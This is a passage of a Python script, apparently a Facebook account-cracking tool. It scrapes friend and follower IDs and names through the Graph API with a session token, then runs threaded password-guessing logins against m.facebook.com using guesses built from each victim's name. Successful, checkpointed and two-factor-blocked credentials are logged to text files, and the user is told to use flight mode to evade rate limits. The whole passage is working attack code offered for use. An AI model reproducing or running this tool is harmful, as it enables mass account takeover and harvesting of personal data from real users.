            print(' Total ids extracted: '+str(len(open(fs,'r').read().splitlines())))
            print(' File saved as: '+fs)
            input('\n Press enter to back ')
            main()
        elif opt2 =='2':
            os.system('clear')
            print(logo)
            try:
                li = int(input(' How many ids do you want to add ? '))
            except:
                li = 1
            print('\n\033[1;97mExample: /sdcard/filename.txt\033[0;97m')
            fsi = input(' Save file as: ')
            if '/sdcard/' in fsi:
                fs = fsi
            else:
                fs = '/sdcard/'+fsi
            tc = []
            t = 0
            for _ in range(li):
                t +=1
                try:
                    idt = input(' Put id no %s: '%t)
                    fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,fb_token)
                    xyz = requests.Session()
                    fd = xyz.get(fd_url,cookies=fb_cookies).text
                    fl = json.loads(fd)
                    for i in fl['friends']['data']:
                        uid = i['id']
                        fnames = i['name']
                        open(fs,'a').write(uid+'|'+fnames+'\n')
                        tc.append(uid)
                except requests.exceptions.ConnectionError:
                    print(' No internet connection ...')
                    pass
                except KeyError:
                    if 'enrolled' in fl:
                        print('  Logged in id got checkpoint, try another account ...')
                        os.system('rm -rf fb_cookies.txt access_token.txt')
                        exit()
                    else:
                        print(' No friendlist found ...')
                        pass
            print(50*'-')
            print(' Total ids: '+str(len(tc)))
            print(' File saved as: '+fs)
            input('\n Press enter to back ')
            main()
        else:
            print(' Choose valid option ...')
            time.sleep(1)
            create_file_login()
    elif opt =='2':
        os.system('clear')
        print(logo)
        try:
            li = int(input(' How many ids do you want to add ? '))
        except:
            li = 1
        print('\n\033[1;97mExample: /sdcard/ranaidz.txt\033[0;97m')
        fsi = input(' Save file as: ')
        if '/sdcard/' in fsi:
            fs = fsi
        else:
            fs = '/sdcard/'+fsi
        tc = []
        t = 0
        for _ in range(li):
            t +=1
            try:
                idt = input(' Put id no %s: '%t)
                fd_url = 'https://graph.facebook.com/%s?fields=subscribers.fields(id,name)&access_token=%s'%(idt,fb_token)
                xyz = requests.Session()
                fd = xyz.get(fd_url,cookies=fb_cookies).text
                fl = json.loads(fd)
                for i in fl['subscribers']['data']:
                    uid = i['id']
                    fnames = i['name']
                    open(fs,'a').write(uid+'|'+fnames+'\n')
                    tc.append(uid)
            except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
                break
            except KeyError:
                if 'enrolled' in fl:
                    print('  Logged in id got checkpoint, try another account ...')
                    os.system('rm -rf fb_cookies.txt access_token.txt')
                    exit()
                else:
                    print(' No friendlist found ...')
                    break
        print(50*'-')
        print(' Total ids: '+str(len(tc)))
        print(' File saved as: '+fs)
        input('\n Press enter to back ')
        main()
def file_crack():
    global ok,cp,tf
    os.system('clear')
    print(logo)
    print('\033[1;37m[1] METHOD {free}')
    print('\033[1;37m[2] METHOD {mobile}')
    print('\033[1;37m[3] METHOD {mbasic}')
    print('\033[1;37m------------------------------------------------')
    opt_method = input(' CHOOSE METHOD: ')
    os.system('clear')
    print(logo)
    show(' Use flight mode before using starting crack')
    file = input(' Put file path: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(' No file found on provided path ...')
        time.sleep(1)
        file_crack()
    plist = []
    try:
        ps_limit = int(input(' How many passwords do you want to add ? '))
    except:
        ps_limit =1
    print(' ')
    for i in range(ps_limit):
        plist.append(input(f' Put password {i+1}: '))
    with ThreadPool(max_workers=30) as crack_submit:
        os.system('clear')
        print(logo)
      #  show(' Use flight mode before using starting crack')
        total_ids = str(len(fo))
        print('\033[1;36mTotal ids: '+total_ids)
        print("\033[1;36mUse Flight Mode IDS NOT COMING\033[1;37m")
        print('\033[1;37m------------------------------------------------')
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if opt_method =='1':
                crack_submit.submit(method1,ids,names,passlist,total_ids)
            elif opt_method =='2':
                crack_submit.submit(method2,ids,names,passlist,total_ids)
            else:
                crack_submit.submit(method3,ids,names,passlist,total_ids)
    print(50*'-')
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
    input('\n Press enter to back ')
    main()
def method1(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    rcol =['\033[1;327m','\033[1;37m','\033[1;37m','\033[1;37m','\033[1;37m','\033[1;37m']
    rr = random.choice(rcol)
    whi = '\033[1;97m'
    sys.stdout.write('\r%s|OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            ua7 = random.choice(MUNA)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr'
            hed1 = {}
            req1 = r.get(url1,headers=hed1)
            data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),'uid' : ids,'pass' : pas,'next' : f'https://mbasic.facebook.com/login/save-device/','flow' : 'login_no_pin','submit' : 'Log In'}
            url2 = f'https://m.facebook.com/login/device-based/validate-password/?shbl=0'
            hed2 = ({
                'Host':'m.facebook.com',
'content-length':'18333',
'sec-ch-ua':'"Chromium";v="106","Google Chrome";v="106","Not;A=Brand";v="99"',
'sec-ch-ua-platform':'"Linux"',
'sec-ch-ua-mobile':'?0',
'accept':'*/*',
'sec-fetch-site':'same-origin',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://m.facebook.com/?tbua=1',
'accept-encoding':'gzip, deflate, br',
'accept-language':'en-US,en;q=0.9',
'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',})
            next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
            cookies = r.cookies.get_dict().keys()
            if 'c_user' in cookies:
                print('\r\r\033[1;32m[OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                print('\r\r\033[1;37m\x1b[38;5;208m[CP] '+ids+' | '+pas+'\033[1;97m')
                cp.append(ids)
                open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'Enter login code to continue' in cookies:
                print('\r\r\033[1;36m[MUNA-2F] '+ids+' | '+pas+'\033[1;97m')
                tf.append(ids)
                open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass


main()
